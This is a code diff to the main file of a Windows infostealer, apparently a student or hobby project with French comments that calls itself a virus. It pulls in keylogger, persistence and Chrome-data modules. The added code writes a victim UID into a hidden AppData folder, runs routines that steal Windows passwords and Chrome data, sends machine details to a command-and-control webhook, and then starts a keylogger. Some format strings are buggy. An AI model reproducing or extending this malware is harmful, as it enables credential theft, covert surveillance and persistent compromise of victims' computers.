@@ -8,6 +8,7 @@
 #include "chrome_data.c"
 #include "persistance.c"
 #include "keylogger.c"
+#include <stdlib.h>
 
 #include "../include/http.h"
 #include "../include/structures.h" //structure COMPUTER_INFOS
@@ -37,29 +38,63 @@ int main(void)
     char softwareDataDirectory[1024];
     snprintf(softwareDataDirectory, 1024, "C:\\Users\\%s\\AppData\\Local\\G666", computer.username);
 
+    //creation d'un uid
+    srand( time( NULL ) );
+    int random_uid = rand() % 10000001;
+    char uid[30]; // random entre 0 et 10000
+    snprintf(uid, 30, "%d", random_uid);
+
+    char *filename = "user";
+        char uid_file_path[500];
+    snprintf(uid_file_path, 500 , "%s\\%s", softwareDataDirectory, filename);
+
     if (is_first_execution(current_executable_path, softwareDataDirectory, fake_executable_name))
     {
         // je créer le dossier du logiciel
         CreateDirectory(softwareDataDirectory, NULL);
         set_persistance(softwareDataDirectory, current_executable_path, fake_executable_name); // fonction à amméliorer pour que si refus des droits admin, dossier de démarage simplement
 
-        // C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp // dossier de démarrage de windows
 
-        /*// Chemin du répertoire du logiciel et nom de l'exécutable
-        const char *repertoireLogiciel = "C:\\Users\\%s\\AppData\\Local\\G666";
-        const char *nomExecutable = "main.exe";
-        add_winstart(repertoireLogiciel, nomExecutable);*/
+        // Enregistrer l'uid dans dans le repertoire du virus un fichier
+        FILE *file = fopen(uid_file_path, "w");
+        if (file == NULL) {
+            perror("Erreur à l'ouverture du fichier en écriture");
+        }
+        fprintf(file, "%d", uid);
+        fclose(file);
 
         save_and_send_windows_users_password(&computer);
         send_chrome_data_files(&computer);
+
+    
+    } else{
+
+        // on recupere l'uid qui est censé exister
+        FILE *file = fopen(uid_file_path, "r");
+    
+       if (file == NULL) {
+            perror("Erreur à l'ouverture du fichier en lecture");
+        }
+
+        char buffer[256];
+        fgets(buffer, sizeof(buffer), file);
+        printf("%s", buffer);
+
+        snprintf(uid, sizeof(uid), "%s", buffer);
+        fclose(file);
     }
 
     printf("\nComputer Name: %s\n", computer.computer_name);
     printf("Username: %s\n", computer.username);
     printf("Windows Version: %s\n", computer.windows_version);
     printf("Architecture: %s\n\n", computer.architecture);
+    printf("UID: %s\n\n", uid);
 
-    send_to_server("webhook/client.php", "{\"client_id\":1}");
+    char client_data[1000];
+
+    snprintf(client_data, 1000,  "{\"uid\":\"%d\", \"computer_name\": \"%s\", \"username\": \"%s\", \"windows_version\": \"%s\", \"architecture\": \"%s\"}", uid, computer.computer_name,  computer.username, computer.windows_version, computer.architecture);
+    send_to_server("webhook/client.php", client_data);
+
 
     start_keylogger();
 
